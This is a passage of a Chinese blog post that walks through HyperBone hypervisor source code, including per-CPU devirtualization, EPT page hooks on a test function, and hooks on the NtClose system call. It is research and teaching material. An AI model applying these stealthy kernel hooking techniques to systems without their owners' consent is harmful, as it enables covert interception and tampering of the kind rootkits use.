class="comment"></span></span><br><span class="line"><span class="comment">    死锁是指两个或多个线程互相等待对方所持有的资源。在这种情况下，如果回调函数依赖于当前线程的某些资源，</span></span><br><span class="line"><span class="comment">    并且该资源在其他处理器上被另一个线程持有，那么当前线程会一直等待资源释放，从而导致死锁。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    为了避免潜在的死锁风险，作者决定屏蔽调用 KeGenericCallDpc 函数的代码，</span></span><br><span class="line"><span class="comment">    并采用其他方式来停止虚拟化的每个CPU。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">// KeGenericCallDpc( HvmpHVCallbackDPC, NULL ); there will be Dead Lock</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取系统中活动处理器的数量，并循环依次处理每个处理器</span></span><br><span class="line">ULONG number_of_processors = <span class="built_in">KeQueryActiveProcessorCountEx</span>(ALL_PROCESSOR_GROUPS);</span><br><span class="line"><span class="keyword">for</span> (ULONG processor_index = <span class="number">0</span>; processor_index &lt; number_of_processors; processor_index++) &#123;</span><br><span class="line">PROCESSOR_NUMBER processor_number;</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(&amp;processor_number, <span class="built_in">sizeof</span>(PROCESSOR_NUMBER));</span><br><span class="line">        <span class="comment">// 获取当前处理器的PROCESSOR_NUMBER处理器编号结构体</span></span><br><span class="line">NTSTATUS status = <span class="built_in">KeGetProcessorNumberFromIndex</span>(processor_index, &amp;processor_number);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgBreakPoint</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Switch the current processor</span></span><br><span class="line">GROUP_AFFINITY affinity;</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(&amp;affinity, <span class="built_in">sizeof</span>(GROUP_AFFINITY));</span><br><span class="line">        <span class="comment">// 表示将当前处理器作为目标处理器</span></span><br><span class="line">affinity.Group = processor_number.Group;</span><br><span class="line">affinity.Mask = <span class="number">1ull</span> &lt;&lt; processor_number.Number;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        系统组亲和性（System Group Affinity）是一种将线程限制在特定处理器组上运行的机制。</span></span><br><span class="line"><span class="comment">        在支持 NUMA（非统一内存访问）的系统中，处理器分为多个组，每个组具有自己的本地内存和其他资源。</span></span><br><span class="line"><span class="comment">        通过设置线程的系统组亲和性，可以使线程优先在特定的处理器组上运行，以提高性能和资源的局部性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        KeSetSystemGroupAffinityThread 函数用于设置线程的系统组亲和性。它接受一个参数affinity，</span></span><br><span class="line"><span class="comment">        表示要设置的系统组亲和性信息。affinity 结构体中的字段包括 Mask 和 Group，</span></span><br><span class="line"><span class="comment">        分别表示处理器组掩码和组索引。通过调用该函数，可以将线程限制在指定的处理器组上运行。</span></span><br><span class="line"><span class="comment">        将原本的信息返回到previous_affinity</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        KeRevertToUserGroupAffinityThread 函数用于恢复线程的用户组亲和性。当线程的系统组亲和性被设置后，</span></span><br><span class="line"><span class="comment">        如果希望将其恢复为默认的用户组亲和性，则可以调用该函数。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        GROUP_AFFINITY previous_affinity;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(&amp;affinity, <span class="built_in">sizeof</span>(GROUP_AFFINITY));</span><br><span class="line">        <span class="comment">// 将当前线程切换到目标处理器</span></span><br><span class="line"><span class="built_in">KeSetSystemGroupAffinityThread</span>(&amp;affinity, &amp;previous_affinity);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取指向当前处理器的指针，停止该处理器的虚拟化</span></span><br><span class="line">PVCPU pVCPU = &amp;g_Data-&gt;cpu_data[processor_index];</span><br><span class="line"><span class="built_in">IntelRestoreCPU</span>(pVCPU);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将当前线程切换回原来的处理器</span></span><br><span class="line"><span class="built_in">KeRevertToUserGroupAffinityThread</span>(&amp;previous_affinity);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgBreakPoint</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestStart</span><span class="params">( IN BOOLEAN SyscallHook, IN BOOLEAN PageHook1, IN IN BOOLEAN PageHook2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (PageHook1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TestPageHook</span>();<span class="comment">// 测试页面钩子</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 尝试获取 NtClose 系统调用函数的地址，并将其保存到全局变量 g_NtClose 中。</span></span><br><span class="line">    g_NtClose = (PVOID)<span class="built_in">UtilSSDTEntry</span>( <span class="built_in">SSDTIndex</span>( &amp;ZwClose ) );</span><br><span class="line">    <span class="keyword">if</span> (g_NtClose)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果获取到</span></span><br><span class="line">        <span class="keyword">if</span> (SyscallHook)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( <span class="built_in">SHInitHook</span>() ))<span class="comment">// 系统调用入口钩子</span></span><br><span class="line">                <span class="built_in">SHHookSyscall</span>( <span class="built_in">SSDTIndex</span>( &amp;ZwClose ), (PVOID)hkNtClose, <span class="number">1</span> );<span class="comment">// 将系统调用函数的地址与自定义hkNtClose进行钩子绑定</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: SHInitHook() failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (PageHook2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (g_NtClose)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( <span class="built_in">PHHook</span>( g_NtClose, (PVOID)hkNtClose2 ) ))<span class="comment">// 将全局系统调用函数的地址与自定义hkNtClose2进行钩子绑定</span></span><br><span class="line">                    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: PHHook() failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: NtClose not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: NtClose not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试页面钩子"><a href="#测试页面钩子" class="headerlink" title="测试页面钩子"></a>测试页面钩子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestPageHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 缓冲区</span></span><br><span class="line">    UCHAR buf[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// TestFn函数地址</span></span><br><span class="line">    PVOID pFn = (PVOID)TestFn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制函数地址前16字节到缓冲区，调用TestFn函数</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( buf, pFn, <span class="number">16</span> );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\n&quot;</span>, CPU_IDX, __FUNCTION__, *(PULONG64)buf, <span class="built_in">TestFn</span>( <span class="number">100</span>, <span class="number">5</span> ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将pFn地址与hkTestFn函数进行钩子绑定</span></span><br><span class="line">    <span class="built_in">PHHook</span>( pFn, (PVOID)hkTestFn );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次复制函数地址前16字节到缓冲区</span></span><br><span class="line">    <span class="comment">// 此时钩子生效，调用TestFn函数时，实际上调用的是hkTestFn函数</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( buf, pFn, <span class="number">16</span> );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\n&quot;</span>, CPU_IDX, __FUNCTION__, *(PULONG64)buf, <span class="built_in">TestFn</span>( <span class="number">100</span>, <span class="number">5</span> ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复钩子</span></span><br><span class="line">    <span class="built_in">PHRestore</span>( pFn );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次复制函数地址前16字节到缓冲区，查看结果</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( buf, pFn, <span class="number">16</span> );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\n&quot;</span>, CPU_IDX, __FUNCTION__, *(PULONG64)buf, <span class="built_in">TestFn</span>( <span class="number">100</span>, <span class="number">5</span> ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TestFn"><a href="#TestFn" class="headerlink" title="TestFn"></a>TestFn</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指示放在.text0段中</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(<span class="string">&quot;.text0&quot;</span>, TestFn)</span></span><br><span class="line"><span class="function">ULONG64 <span class="title">TestFn</span><span class="params">( ULONG64 in1, ULONG64 in2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 对传入的参数进行一些数学运算</span></span><br><span class="line">    ULONG64 data1 = <span class="number">0x500</span>;</span><br><span class="line">    data1 += in1;</span><br><span class="line">    in2 -= <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">return</span> in1 + in2 * <span class="number">3</span> - in1 / in2 + data1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="hkTestFn"><a href="#hkTestFn" class="headerlink" title="hkTestFn"></a>hkTestFn</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(<span class="string">&quot;.text1&quot;</span>, hkTestFn)</span></span><br><span class="line"><span class="function">ULONG64 <span class="title">hkTestFn</span><span class="params">( ULONG64 in1, ULONG64 in2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取 TestFn 函数的 hook entry</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pEntry = <span class="built_in">PHGetHookEntry</span>( (PVOID)(ULONG_PTR)TestFn );</span><br><span class="line">    <span class="keyword">if</span> (pEntry)</span><br><span class="line">        <span class="comment">// 将其 OriginalData 字段转换为函数指针，并调用原始函数，传入参数 in1 和 in2。</span></span><br><span class="line">        ((<span class="built_in">ULONG64</span>( *)(ULONG64, ULONG64))(ULONG_PTR)pEntry-&gt;OriginalData)(in1, in2);</span><br><span class="line">    <span class="comment">// 返回固定值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xDEADBEEF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取对应函数的HookEntry"><a href="#获取对应函数的HookEntry" class="headerlink" title="获取对应函数的HookEntry"></a>获取对应函数的HookEntry</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get hook data by function pointer</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found entry or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PPAGE_HOOK_ENTRY <span class="title">PHGetHookEntry</span><span class="params">( IN PVOID ptr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span> || <span class="built_in">IsListEmpty</span>( &amp;g_PageList ))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历g_PageList查找匹配的HookEntry钩子入口数据结构</span></span><br><span class="line">    <span class="keyword">for</span> (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 计算PAGE_HOOK_ENTRY结构体的地址</span></span><br><span class="line">        PPAGE_HOOK_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, PAGE_HOOK_ENTRY, Link );</span><br><span class="line">        <span class="comment">// 判断是否找到了匹配的PAGE_HOOK_ENTRY</span></span><br><span class="line">        <span class="keyword">if</span> (pEntry-&gt;OriginalPtr == ptr)</span><br><span class="line">            <span class="keyword">return</span> pEntry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="页面钩子"><a href="#页面钩子" class="headerlink" title="页面钩子"></a>页面钩子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Hook function</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pFunc&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pHook&quot;&gt;Hook address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// /// &lt;param name=&quot;Type&quot;&gt;Hook type&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">PHHook</span><span class="params">( IN PVOID pFunc, IN PVOID pHook )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PUCHAR CodePage = <span class="literal">NULL</span>;</span><br><span class="line">    BOOLEAN Newpage = FALSE;</span><br><span class="line">    PHYSICAL_ADDRESS phys = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    phys.QuadPart = MAXULONG64;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查EPT是否开启，权限是否为仅执行</span></span><br><span class="line">    <span class="keyword">if</span> (!g_Data-&gt;Features.EPT || !g_Data-&gt;Features.ExecOnlyEPT)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_SUPPORTED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查页面是否已经被钩子</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pEntry = <span class="built_in">PHGetHookEntryByPage</span>( pFunc, DATA_PAGE );</span><br><span class="line">    <span class="keyword">if</span> (pEntry != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 已经有钩子，获取HookEntry中的CodePageVA</span></span><br><span class="line">        CodePage = pEntry-&gt;CodePageVA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 没有钩子，分配一个连续页面</span></span><br><span class="line">        CodePage = <span class="built_in">MmAllocateContiguousMemory</span>( PAGE_SIZE, phys );</span><br><span class="line">        Newpage = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CodePage == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配PAGE_HOOK_ENTRY结构体内存</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pHookEntry = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPool, <span class="built_in">sizeof</span>( PAGE_HOOK_ENTRY ), HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pHookEntry == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( pHookEntry, <span class="built_in">sizeof</span>( PAGE_HOOK_ENTRY ) );</span><br><span class="line">    <span class="comment">// 将原始函数代码拷贝到CodePage所指向的内存页</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( CodePage, <span class="built_in">PAGE_ALIGN</span>( pFunc ), PAGE_SIZE );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将原始函数代码拷贝到PAGE_HOOK_ENTRY的OriginalData缓冲区，并记录复制的代码长度</span></span><br><span class="line">    NTSTATUS status = <span class="built_in">PHpCopyCode</span>( pFunc, pHookEntry-&gt;OriginalData, &amp;pHookEntry-&gt;OriginalSize );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pHookEntry, HB_POOL_TAG );</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算函数地址相对于页面的偏移</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    掩码运算通过将一个页面大小减一的二进制数作为掩码，与待对齐地址进行位运算，</span></span><br><span class="line"><span class="comment">    将指定位数之外的位都设置为0，从而达到向4kb对齐的目的。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ULONG_PTR page_offset = (ULONG_PTR)pFunc - (ULONG_PTR)<span class="built_in">PAGE_ALIGN</span>( pFunc );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化JUMP_THUNK结构体，用于跳转到Hook函数</span></span><br><span class="line">    JUMP_THUNK thunk = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">PHpInitJumpThunk</span>( &amp;thunk, (ULONG64)pHook );</span><br><span class="line">    <span class="built_in">memcpy</span>( CodePage + page_offset, &amp;thunk, <span class="built_in">sizeof</span>( thunk ) );<span class="comment">// 将JUMP_THUNK结构体拷贝到CodePage的偏移处</span></span><br><span class="line"></span><br><span class="line">    pHookEntry-&gt;OriginalPtr = pFunc;<span class="comment">// 原始函数地址</span></span><br><span class="line">    pHookEntry-&gt;DataPageVA = <span class="built_in">PAGE_ALIGN</span>( pFunc );<span class="comment">// 数据页面虚拟地址</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    物理帧号是指在操作系统中用来管理物理内存的一种编号方式。</span></span><br><span class="line"><span class="comment">    物理内存由一系列连续的物理页面（或称为物理帧）组成，每个物理页面的大小通常是固定的，</span></span><br><span class="line"><span class="comment">    比如4KB或者更大的幂次方。</span></span><br><span class="line"><span class="comment">    物理帧号是用来标识这些物理页面的唯一数字编号。它与物理内存地址相对应，可以用于将逻辑地址映射到物理地址。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    操作系统通过维护一个数据结构（如页表、段表等）来管理和跟踪物理内存的使用情况。</span></span><br><span class="line"><span class="comment">    这些数据结构中的条目使用物理帧号来标识每个物理页面的状态，如被使用、空闲、保留等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    通过使用物理帧号，操作系统可以实现内存分页机制、内存保护、虚拟内存管理等功能。</span></span><br><span class="line"><span class="comment">    它使得操作系统能够有效地管理和控制物理内存资源，同时提供了对进程的内存访问控制和地址映射的支持。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pHookEntry-&gt;DataPagePFN = <span class="built_in">PFN</span>( <span class="built_in">MmGetPhysicalAddress</span>( pFunc ).QuadPart );<span class="comment">// 数据页面物理帧号</span></span><br><span class="line">    pHookEntry-&gt;CodePageVA = CodePage;<span class="comment">// 代码页面虚拟地址</span></span><br><span class="line">    pHookEntry-&gt;CodePagePFN = <span class="built_in">PFN</span>( <span class="built_in">MmGetPhysicalAddress</span>( CodePage ).QuadPart );<span class="comment">// 代码页面物理帧号</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查全局链表是否为空，如果为空则初始化链表</span></span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">InitializeListHead</span>( &amp;g_PageList );</span><br><span class="line">    <span class="built_in">InsertTailList</span>( &amp;g_PageList, &amp;pHookEntry-&gt;Link );<span class="comment">// 将PAGE_HOOK_ENTRY结构体插入全局链表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新分配的页面</span></span><br><span class="line">    <span class="keyword">if</span> (Newpage)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建HOOK_CONTEXT结构体，设置对应的值</span></span><br><span class="line">        HOOK_CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ctx.Hook = TRUE;</span><br><span class="line">        ctx.DataPagePFN = pHookEntry-&gt;DataPagePFN;</span><br><span class="line">        ctx.CodePagePFN = pHookEntry-&gt;CodePagePFN;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行PHpHookCallbackDPC回调创建EPT页面映射</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( PHpHookCallbackDPC, &amp;ctx );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="计算物理帧"><a href="#计算物理帧" class="headerlink" title="计算物理帧"></a>计算物理帧</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这里的PFN是一个宏函数，接受一个地址作为参数，使用位移操作符&gt;&gt;将地址右移PAGE_SHIFT位，并将结果强制转换为ULONG64类型，作为物理帧号返回。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PAGE_SHIFT是一个常量或宏，表示页面大小与页内偏移之间的位移量。通常，页面大小是2的幂次方，例如4KB页面大小对应的PAGE_SHIFT值为12，即右移12位。位移操作实际上是对地址进行除法运算，将高位的部分消除，得到一个较小的数值，该数值就是物理帧号。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN(addr)                   (ULONG64)((addr) &gt;&gt; PAGE_SHIFT)</span></span><br></pre></td></tr></table></figure><h4 id="获取页面函数钩子信息"><a href="#获取页面函数钩子信息" class="headerlink" title="获取页面函数钩子信息"></a>获取页面函数钩子信息</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get hook data by page address</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Function pointer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Type&quot;&gt;Page type&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found hook entry or 